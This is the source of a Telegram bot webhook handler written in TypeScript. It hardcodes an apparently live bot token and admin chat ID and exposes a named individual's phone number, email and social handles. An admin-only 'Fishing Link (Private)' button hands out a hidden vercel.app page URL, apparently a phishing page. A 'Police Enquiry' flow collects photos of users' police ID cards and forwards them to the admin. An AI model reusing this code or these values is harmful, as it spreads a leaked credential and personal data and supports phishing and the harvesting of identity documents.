const TELEGRAM_BOT_TOKEN = '7740401254:AAHhnSMhm-dMcv7-4LJCGwHchxRrYhBEsCY';
const ADMIN_CHAT_ID = '7216371031';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// In-memory tracker
const policeRequests = new Map<string, { verified: boolean }>();

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  const body = req.body;
  console.log('📩 Telegram Webhook:', JSON.stringify(body, null, 2));

  const message = body.message || body.callback_query?.message;
  if (!message) return res.status(400).send('No message');

  const chatId = String(message.chat.id);
  const text = body.message?.text;
  const callbackQuery = body.callback_query;

  try {
    // 🟡 /start command
    if (text === '/start') {
      await sendWelcomeWithButtons(chatId);
      return res.status(200).send('OK');
    }

    // 🟢 Photo submission (non-admin)
    const photo = body.message?.photo;
    if (photo && chatId !== ADMIN_CHAT_ID) {
      const fileId = photo.at(-1).file_id;

      policeRequests.set(chatId, { verified: false });

      const caption = `📸 *Police ID Submitted*\nFrom: [User ID: ${chatId}]`;

      await fetch(`${TELEGRAM_API_URL}/sendPhoto`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: ADMIN_CHAT_ID,
          photo: fileId,
          caption,
          parse_mode: 'MarkdownV2',
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: `✅ Verify [${chatId}]`,
                  callback_data: `verify_${chatId}`,
                },
              ],
            ],
          },
        }),
      });

      await sendMessage(chatId,
        `🕵️‍♂️ Your Police ID has been submitted.\nPlease wait while our admin reviews it.`,
      );
      return res.status(200).send('OK');
    }

    // 🔁 Callback handling
    if (callbackQuery) {
      const data = callbackQuery.data;
      const fromChatId = String(callbackQuery.from.id);
      const isAdmin = fromChatId === ADMIN_CHAT_ID;

      if (data === 'details') {
        const adminMessage = isAdmin
          ? `👑 *Admin Details*\nName: Muhammed Rishad AJ\nPhone: 91857088697\nEmail: muhammedrishadaj\\@yahoo\\.com\nTelegram: @mohdrishad\nInstagram: [@r1shaad\\_\\_](https://instagram.com/r1shaad__)`
          : `👤 *Admin Info*\nName: Muhammed Rishad AJ\nPhone: xxx\\-xxx\\-xxxx\nEmail: muhammedrishadaj\\@yahoo\\.com\nTelegram: @mohdrishad\nInstagram: @r1shaad\\_\\_`;
        await sendMessage(fromChatId, adminMessage);
      }
      else if (data === 'fishing') {
        const fishingMessage = isAdmin
          ? `🎣 *Fishing Link \\(Private\\)*\n🔗 ||https://heavenscake\\.vercel\\.app/page\\.html||`
          : `🚫 *This feature is not for you.*\nAccess is restricted.`;
        await sendMessage(fromChatId, fishingMessage);
      }
      else if (data === 'police') {
        const status = policeRequests.get(fromChatId);
        if (status?.verified) {
          await sendMessage(fromChatId,
            `✅ *You're already verified as a police officer.*\nYour confidential access has been granted.`);
        } else if (status) {
          await sendMessage(fromChatId,
            `📸 *You've already submitted your Police ID.*\nPlease wait while the admin reviews it.`);
        } else {
          await sendMessage(fromChatId,
            `🛂 *Police Verification Required*\n\n📸 Please send a clear photo of your *Police ID*.\nOur admin will verify and grant you access.`);
        }
      }
      else if (data.startsWith('verify_') && isAdmin) {
        const [_, target] = data.split('_');
        policeRequests.set(target, { verified: true });

        await sendMessage(target,
          `✅ *You have been verified as a police officer!*\n\nHere are your confidential details:\n\n👤 *Admin Name:* Muhammed Rishad\n📞 *Phone:* +91 98765 43210\n📧 *Email:* secret\\@r1shaad\\.com\n🔐 *API Token:* demo_token_123456\n🧰 *Tools:* Hidden admin panel activated`,
        );
        await sendMessage(ADMIN_CHAT_ID, `✅ Police verified: ${target}`);
      }

      await answerCallback(callbackQuery.id);
      return res.status(200).send('OK');
    }

    res.status(200).send('OK');
  } catch (err) {
    console.error('❌ Bot Error:', err);
    res.status(500).send('Internal Server Error');
  }
}

// 🎛️ Send /start buttons
async function sendWelcomeWithButtons(chatId: string) {
  await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: `👋 Welcome to *Tecky Rishad Bot*! Choose an option:`,
      parse_mode: 'MarkdownV2',
      reply_markup: {
        inline_keyboard: [
          [ { text: '✨ Join Our Community', url: 'https://t.me/r1shaad' } ],
          [ { text: '👤 Admin Details', callback_data: 'details' }, { text: '🎣 Let’s Fish', callback_data: 'fishing' } ],
          [ { text: '🚨 Police Enquiry', callback_data: 'police' } ],
        ],
      },
    }),
  });
}

// ✉️ Generic sender
async function sendMessage(chatId: string, message: string) {
  return fetch(`${TELEGRAM_API_URL}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'MarkdownV2',
    }),
  });
}

// ✅ Callback responder
async function answerCallback(callbackQueryId: string) {
  return fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: callbackQueryId }),
  });
}
